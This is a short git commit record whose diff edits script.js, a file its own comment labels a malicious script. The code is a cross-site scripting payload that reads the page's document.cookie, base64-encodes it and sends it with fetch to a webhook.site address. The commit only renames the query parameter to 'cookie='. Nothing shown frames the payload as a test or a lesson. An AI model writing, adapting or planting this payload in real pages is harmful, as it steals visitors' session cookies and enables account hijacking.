bbd85c0cacabfcaece885ae225322dea5b5b370c
celik1001 <relin1001@gmail.com>
2025-04-10 14:37:30 +0800

    修改參數

--- script.js
+++ script.js
@@ -1,5 +1,5 @@
 // 惡意 script
 <script>
   var cookie = document.cookie;
-  fetch("https://webhook.site/7916beea-b3a9-4e85-bce4-d650211fbb0d?"+window.btoa(cookie))
+  fetch("https://webhook.site/7916beea-b3a9-4e85-bce4-d650211fbb0d?cookie="+window.btoa(cookie))
 </script>;
